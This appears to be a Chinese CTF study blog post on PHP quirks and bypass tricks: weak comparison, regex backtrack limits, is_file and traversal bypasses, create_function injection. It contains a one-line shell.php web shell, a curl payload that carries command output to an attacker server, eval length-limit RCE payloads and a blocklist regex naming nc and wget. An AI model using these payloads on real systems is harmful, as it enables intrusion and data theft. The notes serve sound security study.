---
layout: post
title: php特性小结
category: web安全
date: 2023-8-17
---
远古笔记
<!-- more -->
[toc]

# PHP特性

## PHP-CLI与PHP-FPM

`PHP-CLI`是命令行版本的PHP，而`PHP-FPM`一般是web端的PHP。因此若想修改`PHP.ini`，需要注意修改对应版本的文件。

## 单双引号

- 变量解析不同

`PHP`会解析双引号中的变量，但不会解析单引号中的变量。`preg_match`的时候所以用单引号。

- 转义的字符不同

单引号中仅仅可以转义单引号和转义符本身，双引号中可以转义更多特殊字符。

- 速度差异

毫无疑问单引号更快

- 一般都选择单引号

## 正则表达式preg_match

- 无法对数组进行匹配。若对数组进行匹配，直接返回`false`，并提示`warning`

- 正则表达式修饰符

例如：

```php
preg_match('/^php$/im', $a);
```

其中`i`以及`m`均为正则表达式修饰符。`i`表示不区分大小写，均匹配；`m`表示多行匹配，有换行符的情况下，每一行均进行一次匹配，对于`^`和`$`来说，都算作开头和结尾。例子：

```php
$str = "ph11\nphp";
var_dump(preg_match('/^php$/m', $str));
// 这样也可以匹配到，因为第二行开头到结尾都是"php"
```

正则表达式修饰符：

`s`：匹配符`.`本来匹配换行符之外的任何字符，现在可以匹配换行符。

`g`：全局匹配，会记录每个符合条件的直到字符串结尾位置。

`m`：多行匹配。每一行都可以算开始结束符。

`u`：是否可以正确处理大于`\uFFF`的`Unicode`字符。

`y`：是否只能从`lastIndex`属性规定的位置开始匹配，匹配失败不会尝试后面的字符。

`x`：忽略空白。

`A`：强制从开头匹配。

`D`：如果使用`$`限制结尾字符，则不允许结尾有换行。

- 最大回溯次数：默认为100万

为了防止正则表达式拒绝服务攻击，由`pcre.backtrack_limit`设置了回溯次数上限。假如回溯次数超过100万，则`preg_match`不再返回1或0，而直接返回`false`。

示例如下：

```php
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

阅读代码，大意即是传入的字符需拥有`ctfshow`这个字符串，但同时正则表达式又对字符串进行了一些限制。由于`.+?`会匹配相同的字符串无限次，因此可以回溯绕过。

脚本编写如下：

```python
import requests
url = 'http://7aa03b05-6a9a-4777-9548-7ac30f8799ed.challenge.ctf.show/'
response = requests.post(url, data={'f':250000*'aaaa'+'ctfshow'})
print(response.text)
```

注意的是一般来说请求的字符长度也是有限制的，因此不要写得太大。

## intval()函数

- 函数原型

```php
intval ( mixed $var [, int $base = 10 ] ) : int
```

将字符串按照给定的进制输出。

首先，当传入的`$var`是字符串类型时，若没有指定`$base`，默认按照十进制处理，传入十六进制数可能无法处理。当`$var`是数字类型时也可以直接处理十六进制等。来个例子：

```php
echo intval('0xa');
// 上面输出0，因为没有指定进制，按照输出十进制处理
echo intval('0xa', 10);
// 上面输出10
```

- 返回结果相同但字符串不相同的情况

```php
intval('4476.0')===4476    // 小数点  
intval('+4476.0')===4476   // 正负号
intval('4476e0')===4476    // 科学计数法
intval('0x117c')===4476    // 16进制
intval('010574')===4476    // 8进制
intval(' 010574')===4476   
// 8进制+空格xxxxxxxxxx intval(intval('4476.0')===4476    小数点  intval('+4476.0')===4476   正负号intval('4476e0')===4476    科学计数法intval('0x117c')===4476    16进制intval('010574')===4476    8进制intval(' 010574')===4476   8进制+空格)php
```

## md5()函数

- 首先，在弱比较（两个等号）的情况下，若`md5`后结果为`0e`开头的识别为科学计数法，结果均为0.（0的任意次方均为0）

```php
$a = 'QNKCDZO';
$b = '240610708';

var_dump(md5($a) === md5($b)); // True

```

- 对于数组，输出结果为`NULL`。因此可以利用数组进行强相等的构造。


## in_array()函数

内部是使用`==`运算符，因此是弱类型比较，需要注意。

### and运算符和&&运算符

`and`运算符的优先级很低，甚至低于赋值操作`=`。

`&&`运算符的优先级高于赋值操作`=`。

例子如下：

```php
$a = 1;
$b = 0;
$c = 0;
$output = $a && $b && $c;
var_dump($output);   // bool(false)

$a = 1;
$b = 0;
$c = 0;
$output = $a and $b and $c;
var_dump($output);   // int(1)
```

## is_numeric()函数

在`php7`和`php5`下是有差别的。

在`php5`的环境下，可以识别字符串类型的十六进制，在`php7`中则不可以。

如下：

```php
//php5
var_dump(is_numeric('0xa')); // true
var_dump(is_numeric(0xa));  // true

var_dump(is_numeric('0xa')); // false
var_dump(is_numeric(0xa)); // true
```

## ereg()函数

函数接受两个参数，第一个是正则表达式，第二个参数是待匹配字符串。

若匹配到了，返回`true`，没有则返回`false`。

该函数主要是存在漏洞，即可以使用`%00`截断，后面的部分不会被正则表达式校验。

## 超全局变量$GLOBALS

包含全部变量的全局组合数组，变量的名字是数组的键。

## is_file()函数

判断传入的参数是否是一个文件。若是，则返回`true`。

可以使用一些伪协议的方式绕过该函数。一些例子：

```php
var_dump(is_file('php://filter/resource=flag.php')); // false
var_dump(is_file('compress.zlib://flag.php')); // false
// 这是一种压缩的伪协议
```

此外，可以使用目录穿越的方式绕过`is_file()`：

（`/proc/self/root`相当于又回到了根目录，因此可以重复使用多次，暂不清楚多次目录穿越后可以绕过的原理。）

```php
var_dump(is_file('/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php')); // false
```



## \$\_POST的特殊字符键值

对于`$_POST`，键值对的key是不能有一些特殊符号的，一些特殊符号经测试会被变为`_`。

示例：

```php
var_dump($_POST);
```

对上面这段代码进行POST，传递`who_are.you=1`，结果是：

```php
array(1) { ["who_are_you"]=> string(1) "1" }
```

可以看到这里的`.`被解析成了`_`。

但假如某些情况下，需要构造`.`这个键怎么办捏？

看了其他师傅爆破了一下，发现若传递：`who[are.you=1`的时候，结果变为：

```php
array(1) { ["who_are.you"]=> string(1) "1" }
```

即将第一个会被替换的特殊字符替换为`[`后，后面的特殊字符便不会被解析成`_`。这个情况也只能有`_`的时候才方便利用，其他情况遇到了也可以自己fuzz一下。

## $_SERVER

对于`CLI`版本的PHP和`FPM`版本的PHP，`$_SERVER`也有一些区别。

`CLI`版本下：

`$_SERVER['argv'][0]`是脚本的名称，而其余的是传递给脚本的参数。

`FPM`版本下：

需要在`php.ini`开启`register_argc_argv`配置，默认是关闭的。

此时，`$_SERVER['argv'][0]`的值和`$_SERVER['QUERY_STRING']`等价。

而`$_SERVER['argv']`的值是什么捏？先说结论，它的值是`GET`方式传递的值再以`+`分隔形成的数组。

简单的例子：

```php
var_dump($_SERVER['argv']);
```

使用`GET`方式传入：

```bash
?a=1+b=2
```

得到如下结果：

```php
array(2) { [0]=> string(3) "a=1" [1]=> string(3) "b=2" }
```

## _()函数（等价于gettext()函数）

看标题知道这个特殊的地方，在于`_()`函数是一个仅仅由下划线组成的函数，没有数字和字母。

`gettext()`函数即是返回传入的字符本身，是一个用于处理多国语言的函数。需要安装后开启才能使用。

示例：（来自`CTFSHOW`）

```php
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}



function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
}
```

## 目录穿越

有的时候会使用目录穿越的方式绕过，比如会要求字符串长度、字符串出现在指定位置等等。

要注意，目录穿越的时候可以穿越到不存在的目录，再往回穿越。

示例：

```php
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

简单阅读代码就是要让`cftshow`出现在要读取的文件的非开头位置。

一个可能的`payload`：

```php
?f=/ctfshow/../../../../../../var/www/html/flag.php
```

这里`ctfshow`目录是不存在的，但仍然可以访问到`flag.php`。

## 字符串截断-变量覆盖

这里主要是针对某些情况下的`RCE`被限定字符长度。先上示例：

```php
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

可以看到难点即在于这个`substr`。但这个地方，观察后发现`$_GET['F']`被赋值给了`$F`，接下来这个变量才被用于截断。那先上`payload`，再解释。

```php
?F=`$F `;sleep 3
```

通过传入上面的`payload`，`$F`变量在`if`语句里面被赋值为:

```php
`$F `;sleep 3
```

这样一来，在`eval`函数的地方，将先执行`substr($F,0,6)`（先后顺序，和我们传入的无关）

然后这段代码其实执行的是：

```php
eval("`$F `;");
```

相当于执行了这个：

```php
`$F `;
```

我们知道反引号其实是`shell_exec`函数，那么最终相当于执行：

```php
shell_exec($F );
```

已知`$F`是整段`payload`，那么即执行了：

```php
shell_exec("`$F `;sleep 3");
```

在服务器上执行了两个命令，以冒号分隔，分别是：

```bash
`$F `
```

和

```bash
sleep 3
```

到这里我们明白，`payload`中`;`之后的是我们可以操控执行的任意无回显`RCE`。其实感觉主要是变量赋值和`eval`的使用不当，不太是变量覆盖，毕竟也没有覆盖什么变量。

## CURL带出命令执行结果

无回显的RCE有多种解决方法，此处写一下使用`CURL`带出命令。

`CURL`是一个命令行的`web`数据包工具，功能还比较强大，有空可以专门来写一下`CURL`用法。

这里咱们写一下怎么使用`CURL`带出命令的执行结果。

我们在被攻击机器上写一个无回显的命令执行脚本`shell.php`：

```php
<?php
    shell_exec($_GET[1]);
```

此时我们可以用`http://xxx/shell.php?1=`的方式执行任意无回显的命令。

用`CURL`命令怎么让结果显示出来捏？

先上`payload`：

```php
?1=curl http://yyy?p=`pwd`
```

说明一下，`http://yyy`是我们自己的服务器，需要能看到日志，没有的话可以用[这个](https://requestbin.net/)。

`payload`里面的那个`p`随便什么都可以。

传入这个`payload`后，在`php`里会先执行反引号包裹的`pwd`，这样假如说当前路径是`/app`，那么`curl`其实真正访问的是：

```bash
curl http://yyy?p=/app
```

这样我们查看被访问机器里面的日志，就可以看到结果了。

![image-20221011155322021](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210111553378.png)

这里需要注意，带入的数据长度是有限的。因此可以采取`grep`到关键数据或者限定长度的方式来带出数据。

## parse_str()

```php
parse_str(string $string, array &$result): void
// 如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。从PHP8.0开始，$result参数是强制的。
```

示例：

```php
<?php
$str = "first=value&arr[]=foo+bar&arr[]=baz";
// 注意，不需要带引号什么的

// 带第二个参数，推荐
parse_str($str, $output);
echo $output['first'];  // value
echo $output['arr'][0]; // foo bar
echo $output['arr'][1]; // baz

// 不带第二个参数，容易被攻击
parse_str($str);
echo $first;  // value
echo $arr[0]; // foo bar
echo $arr[1]; // baz
?>
```

## extract()

一般情况下，将数组以键值对的方式进行变量的注册，键值对的键为变量名，键值对的值为变量的值。

## 无回显之tee命令

`tee`是`linux`命令，可以监听输出流并输出。

例如，将输入的内容保存到`1.txt`和`2.txt`两个文件：

```bash
tee 1.txt 2.txt
```

之后会提示输入，输入的内容将会被保存至两个文件。（一个文件同理，少加个参数即可

该命令也可以用于将命令的输出保存到文件，即：`

```bash
ls / | tee 1.txt
```

这样将会把根目录下的所有文件名保存到`1.txt`中。

## 类的双冒号

`::`可以直接调用静态方法，此时不需要实例化。

```php
class test{
    static function method(){
        echo 1;
    }
}

test::method();

// 假如要实例化，那就：
$a = new test();
$a->method();
```

## call_user_func

执行函数。

```php
call_user_func(callable $callback, mixed ...$args): mixed
    
// 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。
```

正常情况下此处不再赘述，但`call_user_func`可以接受数组。数组的第一个参数可以被解析为类或对象名，第二个参数被解析为调用的函数。

例如：

```php
class test{
    static function method(){
        echo 1;
    }
}

call_user_func(test::method);
call_user_func(array('test', 'method'));
```

## create_function

先看定义

```php
create_function(string $args, string $code): string
// 动态创建一个函数
// 第一个参数是这个函数需要传递的参数，第二个参数是函数的代码
```

用文档里的示例很一目了然。

使用`create_function()`：

```php
<?php
$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
echo $newfunc(2, M_E) . "\n";
?>
```

上面这个相当于：

```php
<?php
$newfunc = function($a,$b) { return "ln($a) + ln($b) = " . log($a * $b); };
echo $newfunc(2, M_E) . "\n";
?>
```

输出的内容也一样。

第二个参数里面的内容相当于是进行了一次`eval()`。因此，这里可以进行绕过。

```php
if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

这里正则可以通过命名空间绕过，`\create_function()`和`create_function()`等价。

然后，我们`GET`传入`echo 1;phpinfo();//`便可以直接执行`phpinfo()`函数。

原因如下：

```php
create_function('', 'echo 1;phpinfo();//');

# 相当于

function func(){echo 1;}phpinfo();//}
```

我们传入的括号将函数闭合，然后使用双斜杠将后面的括号注释，从而完成直接执行了`phpinfo()`。

## 松散比较

![image-20221011232836591](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202210112328251.png)

比如在`PHP8.0.0`之前，`"PHP"`和`0`是相等的（`==`）。

## 杂项

- `PHP`中可以用`1-phpinfo()-1`的方式来执行函数。减号换成乘除法啥的同理。
- `PHP`中默认的函数命名空间是在`\`下的。因此，函数前面加`\`是不影响的，例如`\var_dump()`。

- `PHP`中可以有中文变量名。例如`$啊=1;`
- `unlink()`函数，可以删除指定文件，遇到的时候优先考虑下条件竞争。
- `PHP`中，索引数组不但可以用`[]`，还可以用`{}`，但`PHP8.1.0`后不再可以。
- `include`函数，可以不需要用括号。例如`include"flag.php"`